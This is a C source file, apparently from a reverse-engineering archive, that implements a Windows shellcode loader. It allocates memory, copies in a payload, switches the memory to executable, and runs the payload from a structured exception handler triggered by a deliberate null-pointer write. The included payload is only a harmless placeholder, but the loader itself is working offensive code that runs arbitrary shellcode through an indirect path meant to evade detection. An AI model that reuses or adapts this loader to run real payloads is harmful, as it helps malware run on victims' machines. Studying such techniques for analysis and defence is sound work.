/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /EHsc /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  try-catch

Note:
    - chain to SEH
*/

#include <windows.h>
#include <stdint.h>

// prototype to exception handler
int handler ();

// pointer to shellcode
int (*func)();


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    ULONG_PTR   arguments[EXCEPTION_MAXIMUM_PARAMETERS];
    PVOID       h;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        func = (int (*)())runtime;

        // trigger exception and catch it
        _try 
        {
            char * ptr = NULL;
            *ptr = 'z';
        }
        _except(handler())
        { }
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);
    func = NULL;

    return 0;
}

int handler ()
{
    // executing by direct invocation
    func();
    return EXCEPTION_EXECUTE_HANDLER;
}